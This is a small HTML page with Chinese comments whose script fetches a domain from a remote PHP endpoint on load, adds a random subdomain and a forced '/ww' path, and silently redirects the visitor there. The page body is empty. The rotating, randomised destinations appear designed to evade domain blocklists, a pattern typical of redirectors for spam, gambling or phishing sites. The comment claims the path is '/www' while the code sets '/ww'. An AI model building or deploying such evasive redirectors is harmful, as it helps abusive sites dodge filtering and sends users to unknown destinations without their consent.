<!DOCTYPE html>
<html>
<head>
    <script>
        fetch('https://wap.uyu.pgylxz302.me/get_links.php')
            .then(response => response.text())
            .then(domain => {
                domain = domain.trim();
                
                // 生成4位随机字母（a-z）
                const random4Char = () => Math.random().toString(36).substring(2, 6);
                const subdomain = random4Char(); // 如 "ab3f"
                
                // 如果没有协议，自动补全 https://
                if (!domain.startsWith('http')) {
                    domain = 'https://' + domain;
                }
                
                // 解析域名，插入随机子域名
                const url = new URL(domain);
                url.hostname = `${subdomain}.${url.hostname}`;
                
                // ✅ 关键修改：在域名后添加 /www
                url.pathname = '/ww';  // 强制设置为 /www（覆盖原有路径）
                
                window.location.href = url.toString();
            });
    </script>
</head>
<body>
    <!-- 可以留空或显示加载提示 -->
</body>
</html>
